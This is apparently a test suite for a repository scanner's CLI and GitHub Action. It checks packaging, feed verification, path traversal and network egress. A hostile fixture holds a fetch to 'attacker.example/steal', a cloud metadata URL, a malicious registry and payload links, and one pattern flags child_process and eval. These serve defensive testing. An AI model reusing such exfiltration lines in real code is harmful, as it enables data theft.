import { spawnSync } from "node:child_process";
import { cpSync, existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import { beforeAll, describe, expect, it } from "vitest";

const root = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const release = JSON.parse(readFileSync(join(root, "release", "package.json"), "utf8")) as {
  name: string;
  version: string;
};
const MAX_BUNDLE_BYTES = 600_000;

const viaShell = (command: string): boolean => process.platform === "win32" && command === "npm";
const path = (p: string): string => (process.platform === "win32" ? `"${p}"` : p);

const run = (command: string, args: string[], cwd: string) => {
  const result = spawnSync(command, args, { cwd, encoding: "utf8", shell: viaShell(command) });
  if (result.error) throw result.error;
  return result;
};

let installed: string;
let bundle: string;
let packedFiles: string[];

const cli = (args: string[], cwd: string) =>
  run(
    process.execPath,
    [join(installed, "node_modules", release.name, "harbyn.mjs"), ...args],
    cwd,
  );

const write = (base: string, files: Record<string, string>): string => {
  for (const [rel, body] of Object.entries(files)) {
    mkdirSync(dirname(join(base, rel)), { recursive: true });
    writeFileSync(join(base, rel), body);
  }
  return base;
};

const source = {
  url: "https://acme.example/changelog",
  kind: "changelog",
  fetchedAt: "2026-01-01T00:00:00Z",
  sha256: "c".repeat(64),
};
const feedDir = (): string =>
  write(mkdtempSync(join(tmpdir(), "feed-")), {
    "vendors/acme.json": JSON.stringify({
      schemaVersion: 1,
      id: "acme",
      name: "Acme",
      homepage: "https://acme.example/",
      category: "ai",
      allowedDomains: ["acme.example"],
      sources: [{ url: "https://acme.example/changelog", format: "html", purpose: "changelog" }],
      detection: {
        packages: [{ ecosystem: "npm", name: "acme-sdk" }],
        apiHosts: ["api.acme.example"],
        modelIdPrefixes: ["acme-"],
      },
    }),
    "events/acme/2026-01-01-acme-1.json": JSON.stringify({
      schemaVersion: 1,
      id: "acme/2026-01-01-acme-1",
      vendor: "acme",
      kind: "retirement",
      status: "announced",
      severity: "high",
      title: "acme-1 retired",
      summary: "acme-1 stops responding.",
      announcedAt: "2026-01-01",
      addedAt: "2026-01-01",
      effectiveAt: "2099-01-01",
      affects: [{ type: "model-id", values: ["acme-1"] }],
      replacement: { targets: [{ type: "model-id", values: ["acme-2"] }] },
      sources: [source],
      review: { state: "automated", extractedBy: "deterministic" },
    }),
  });

beforeAll(() => {
  const build = run(process.execPath, [join(root, "scripts", "build.ts")], root);
  expect(build.status, build.stderr).toBe(0);
  const packDir = mkdtempSync(join(tmpdir(), "pack-"));
  const pack = run(
    "npm",
    ["pack", "--json", "--pack-destination", path(packDir)],
    join(root, "dist", "package"),
  );
  expect(pack.status, pack.stderr).toBe(0);
  const [info] = JSON.parse(pack.stdout) as Array<{
    filename: string;
    files: Array<{ path: string }>;
  }>;
  if (!info) throw new Error("npm pack printed nothing");
  packedFiles = info.files.map((f) => f.path).sort();

  installed = write(mkdtempSync(join(tmpdir(), "customer-")), {
    "package.json": JSON.stringify({ private: true }),
  });
  const install = run(
    "npm",
    [
      "install",
      "--ignore-scripts",
      "--offline",
      "--no-audit",
      "--no-fund",
      path(join(packDir, info.filename)),
    ],
    installed,
  );
  expect(install.status, install.stderr).toBe(0);
  bundle = readFileSync(join(installed, "node_modules", release.name, "harbyn.mjs"), "utf8");
}, 180_000);

describe("published package", () => {
  it("contains exactly the files we mean to ship", () => {
    expect(packedFiles).toEqual([
      "LICENSE",
      "README.md",
      "THIRD_PARTY_NOTICES.md",
      "harbyn.mjs",
      "package.json",
    ]);
  });

  it("has no dependencies and no install scripts, and installs a bin", () => {
    const manifest = JSON.parse(
      readFileSync(join(installed, "node_modules", release.name, "package.json"), "utf8"),
    ) as Record<string, unknown>;
    for (const field of [
      "dependencies",
      "optionalDependencies",
      "peerDependencies",
      "bundleDependencies",
      "scripts",
    ]) {
      expect(manifest[field], field).toBeUndefined();
    }
    const bin = join(
      installed,
      "node_modules",
      ".bin",
      process.platform === "win32" ? "harbyn.cmd" : "harbyn",
    );
    expect(existsSync(bin)).toBe(true);
  });

  it("reports the release version", () => {
    const result = cli(["--version"], installed);
    expect(result.stdout.trim()).toBe(release.version);
  });

  it("finds file:line and never opens secret files", () => {
    const repo = write(mkdtempSync(join(tmpdir(), "repo-")), {
      "src/ai.ts": 'const x = 1;\nclient.create({ model: "acme-1" });\n',
      ".env": "MODEL=acme-1\n",
    });
    const result = cli(["scan", repo, "--json", "--feed-dir", feedDir()], installed);
    expect(result.status, result.stderr).toBe(0);
    const out = JSON.parse(result.stdout) as {
      stats: { skippedSecret: number };
      findings: Array<{ path: string; line: number; token: string; replacement: string[] }>;
    };
    expect(out.findings).toEqual([
      expect.objectContaining({
        path: "src/ai.ts",
        line: 2,
        token: "acme-1",
        replacement: ["acme-2"],
      }),
    ]);
    expect(out.stats.skippedSecret).toBe(1);
  });

  it("ships the pinned production feed key, and fails closed when the feed cannot be fetched", () => {
    expect(bundle).toContain("78e488880f4fca98");
    const repo = write(mkdtempSync(join(tmpdir(), "repo-")), { "a.ts": "" });
    const result = cli(["scan", repo, "--feed-url", "https://127.0.0.1:9/feed.json"], installed);
    expect(result.status).toBe(2);
    expect(result.stderr).toMatch(/feed/i);
    expect(result.stdout).toBe("");
  });
});

describe("network egress of the published bundles", () => {
  const guard = join(root, "test", "fixtures", "egress-guard.mjs");
  const hostile = () =>
    write(mkdtempSync(join(tmpdir(), "hostile-")), {
      "src/client.ts": `await fetch("https://attacker.example/steal");
const base = "http://169.254.169.254/latest/meta-data/";
`,
      "package.json": JSON.stringify({
        name: "x",
        repository: "https://evil.example/repo.git",
        dependencies: { openai: "4.0.0" },
      }),
      ".npmrc": `registry=https://registry.evil.example/
`,
      "README.md": `See https://phishing.example and ftp://files.example/payload
`,
    });
  const guarded = (script: string, args: string[], env: Record<string, string>, cwd: string) => {
    const logFile = join(mkdtempSync(join(tmpdir(), "egress-")), "hosts.log");
    writeFileSync(logFile, "");
    const result = spawnSync(
      process.execPath,
      ["--import", pathToFileURL(guard).href, script, ...args],
      {
        cwd,
        encoding: "utf8",
        env: {
          ...process.env,
          ...env,
          EGRESS_LOG: logFile,
          LOCALAPPDATA: dirname(logFile),
          XDG_CACHE_HOME: dirname(logFile),
        },
      },
    );
    const hosts = [...new Set(readFileSync(logFile, "utf8").split(/\s+/).filter(Boolean))];
    return { status: result.status, hosts };
  };
  const actionEnv = (repo: string, extra: Record<string, string> = {}) => {
    const temp = mkdtempSync(join(tmpdir(), "runner-"));
    return {
      GITHUB_WORKSPACE: repo,
      RUNNER_TEMP: temp,
      GITHUB_OUTPUT: join(temp, "output"),
      GITHUB_STEP_SUMMARY: join(temp, "summary"),
      ACTIONS_ID_TOKEN_REQUEST_URL: "",
      ACTIONS_ID_TOKEN_REQUEST_TOKEN: "",
      ...extra,
    };
  };
  const actionScript = () => join(root, "dist", "action", "harbyn-action.mjs");

  it("CLI: contacts only the feed host, and fails closed when it is unreachable", () => {
    const repo = hostile();
    const result = guarded(
      join(installed, "node_modules", release.name, "harbyn.mjs"),
      ["scan", repo],
      {},
      repo,
    );
    expect(result.status).toBe(2);
    expect(result.hosts).toEqual(["feed.harbyn.com"]);
  });

  it("Action without upload: contacts only the feed host", () => {
    const repo = hostile();
    const result = guarded(actionScript(), [], actionEnv(repo), repo);
    expect(result.status).toBe(0);
    expect(result.hosts).toEqual(["feed.harbyn.com"]);
  });

  it("Action with a local feed and no upload: contacts nothing at all", () => {
    const repo = hostile();
    writeFileSync(join(repo, ".harbyn-test"), "");
    cpSync(join(root, "test", "fixtures", "action-feed"), join(repo, "feed"), { recursive: true });
    const result = guarded(actionScript(), [], actionEnv(repo, { "INPUT_FEED-DIR": "feed" }), repo);
    expect(result.status).toBe(0);
    expect(result.hosts).toEqual([]);
  });

  it("Action with upload: the runner's token service, and nothing else before it answers", () => {
    const repo = hostile();
    cpSync(join(root, "test", "fixtures", "action-feed"), join(repo, "feed"), { recursive: true });
    const env = actionEnv(repo, {
      "INPUT_FEED-DIR": "feed",
      INPUT_UPLOAD: "true",
      INPUT_CONNECTION: "11111111-2222-4333-8444-555555555555",
      ACTIONS_ID_TOKEN_REQUEST_URL: "https://token.actions.example/idtoken?api-version=2.0",
      ACTIONS_ID_TOKEN_REQUEST_TOKEN: "runner-bearer",
    });
    const result = guarded(actionScript(), [], env, repo);
    expect(result.status).toBe(0);
    expect(result.hosts).toEqual(["token.actions.example"]);
  });
});

const bundles = (): Array<[string, string]> => [
  ["CLI", bundle],
  ["action", readFileSync(join(root, "dist", "action", "harbyn-action.mjs"), "utf8")],
];

describe.each(["CLI", "action"])("%s bundle contents", (which) => {
  const code = (): string => bundles().find(([name]) => name === which)?.[1] ?? "";

  it("stays small enough to read", () => {
    expect(Buffer.byteLength(code())).toBeLessThan(MAX_BUNDLE_BYTES);
  });

  it("cannot start processes or evaluate code", () => {
    expect(code()).not.toMatch(/child_process|\beval\s*\(|new Function\s*\(|\bvm\b["']/);
  });

  it("names no network endpoint except the documented ones", () => {
    const urls = [...new Set(code().match(/https?:\/\/[^\s"'`)]+/g) ?? [])].filter(
      (u) =>
        !u.startsWith("http://json-schema.org/") &&
        !u.startsWith("https://json-schema.org/") &&
        !u.includes("${"),
    );
    const expected =
      which === "CLI"
        ? ["https://feed.harbyn.com/v1/feed.json"]
        : [
            "https://api.harbyn.com/ingest/manifest",
            "https://api.harbyn.com",
            "https://feed.harbyn.com/v1/feed.json",
          ];
    expect(urls.sort()).toEqual(expected.sort());
  });

  it("has no invisible or direction-changing characters (Trojan Source)", () => {
    const hidden = (cp: number): boolean =>
      (cp < 0x20 && cp !== 0x09 && cp !== 0x0a && cp !== 0x0d) ||
      (cp >= 0x7f && cp <= 0x9f) ||
      (cp >= 0x200b && cp <= 0x200f) ||
      (cp >= 0x2028 && cp <= 0x202e) ||
      (cp >= 0x2060 && cp <= 0x2069) ||
      cp === 0xfeff;
    const found = [...code()].map((c) => c.codePointAt(0) ?? 0).filter(hidden);
    expect(found.map((cp) => cp.toString(16))).toEqual([]);
  });
});

describe("GitHub Action", () => {
  const action = join(root, "dist", "action", "harbyn-action.mjs");
  const runAction = (
    inputs: Record<string, string>,
    files: Record<string, string> | undefined = {
      "src/ai.ts": 'const x = 1;\nclient.create({ model: "acme-1" });\n',
    },
    extraEnv: Record<string, string> = {},
  ) => {
    const workspace = write(mkdtempSync(join(tmpdir(), "ws-")), files ?? {});
    const runnerTemp = mkdtempSync(join(tmpdir(), "runner-"));
    const outputFile = join(runnerTemp, "output");
    const summaryFile = join(runnerTemp, "summary");
    writeFileSync(outputFile, "");
    writeFileSync(summaryFile, "");
    const cache = join(runnerTemp, "cache");
    const env: Record<string, string> = {
      PATH: process.env.PATH ?? "",
      GITHUB_WORKSPACE: workspace,
      RUNNER_TEMP: runnerTemp,
      GITHUB_OUTPUT: outputFile,
      GITHUB_STEP_SUMMARY: summaryFile,
      LOCALAPPDATA: cache,
      XDG_CACHE_HOME: cache,
    };
    for (const [name, value] of Object.entries(inputs)) env[`INPUT_${name.toUpperCase()}`] = value;
    Object.assign(env, extraEnv);
    const result = spawnSync(process.execPath, [action], { cwd: workspace, env, encoding: "utf8" });
    return {
      ...result,
      outputs: readFileSync(outputFile, "utf8"),
      summary: readFileSync(summaryFile, "utf8"),
      workspace,
    };
  };
  const withFeed = (): Record<string, string> => {
    const feed = feedDir();
    return { "feed-dir": feed };
  };

  it("annotates file:line, writes outputs and a summary, needs no token", () => {
    const r = runAction(withFeed());
    expect(r.status, r.stderr).toBe(0);
    expect(r.stdout).toMatch(
      /^::warning file=src\/ai\.ts,line=2,title=acme-1 retired::acme-1: in \d+ days \(2099-01-01\)\. Use instead: acme-2\./m,
    );
    expect(r.outputs).toMatch(/^findings=1$/m);
    expect(r.outputs).toMatch(/^report=.+harbyn-report\.json$/m);
    expect(r.summary).toContain("src/ai.ts:2");
    expect(r.summary).toContain("Nothing about this repository was sent anywhere.");
  });

  it("names files from the repository root when scanning a subdirectory", () => {
    const r = runAction(
      { ...withFeed(), path: "app" },
      { "app/src/ai.ts": 'client.create({ model: "acme-1" });\n' },
    );
    expect(r.status, r.stderr).toBe(0);
    expect(r.stdout).toMatch(/^::warning file=app\/src\/ai\.ts,line=1,/m);
    expect(r.summary).toContain("app/src/ai.ts:1");
  });

  it("fails the step on findings only when asked", () => {
    expect(runAction({ ...withFeed(), "fail-on": "findings" }).status).toBe(1);
    expect(
      runAction({ ...withFeed(), "fail-on": "findings" }, { "src/clean.ts": "export {};\n" })
        .status,
    ).toBe(0);
  });

  it("abuse: the path input cannot leave the workspace", () => {
    const r = runAction({ ...withFeed(), path: "../.." });
    expect(r.status).toBe(1);
    expect(r.stdout).toMatch(
      /^::error title=harbyn::the path input must stay inside the repository workspace$/m,
    );
  });

  it("rejects unknown option values", () => {
    expect(runAction({ ...withFeed(), "fail-on": "sometimes" }).status).toBe(1);
  });

  it("fails closed without a verifiable feed: warns by default, fails when asked, reports nothing", () => {
    const offline = {
      NODE_OPTIONS: `--import ${pathToFileURL(join(root, "test", "fixtures", "egress-guard.mjs")).href}`,
    };
    const warn = runAction({}, undefined, offline);
    expect(warn.status).toBe(0);
    expect(warn.stdout).toMatch(
      /^::warning title=harbyn::no scan: the change feed could not be verified/m,
    );
    expect(warn.stdout).not.toMatch(/file=/);
    expect(warn.outputs).toMatch(/^findings=$/m);
    expect(runAction({ "on-feed-error": "fail" }, undefined, offline).status).toBe(1);
  });
});
